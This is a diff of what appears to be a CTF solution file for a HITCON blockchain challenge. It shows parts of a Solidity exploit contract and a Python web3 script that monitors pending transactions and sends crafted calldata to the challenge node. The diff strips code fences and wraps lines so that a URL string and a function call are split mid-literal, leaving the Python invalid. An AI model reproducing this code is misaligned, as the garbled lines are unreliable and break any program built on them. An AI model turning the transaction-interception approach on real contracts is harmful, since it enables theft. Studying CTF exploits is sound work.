@@ -237,11 +237,6 @@ contract Exp{
         return health;
     }
 }
-```
-
-
-
-```
 from web3 import Web3
 
 abi = [
@@ -307,7 +302,8 @@ abi = [
     }
 ]
 
-infura_url = "http://lustrous.chal.hitconctf.com:8545/ae72e4aa-7d85-4b82-9992-466e6591cc9b"
+infura_url = "http://lustrous.chal.hitconctf.com:
+8545/ae72e4aa-7d85-4b82-9992-466e6591cc9b"
 web3 = Web3(Web3.HTTPProvider(infura_url))
 
 master_addr = "0xb7350CD25aD42f2d15a4807A63AC2d6572513ef8"
@@ -342,7 +338,8 @@ def handle_pending_transaction(tx_hash):
             func_name = "set_actions2"
             _actions = arguments["actions"]
 
-        calldata = contract.encode_abi(func_name, {"_actions":_actions})
+        calldata = contract.encode_abi(func_name, {"_actions":
+_actions})
         nonce = web3.eth.get_transaction_count(from_address)
         tx = {
             'nonce': nonce,
@@ -376,11 +373,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
-
-
-
-```
 // SPDX-License-Identifier: UNLICENSED
 
 pragma solidity ^0.8.20;
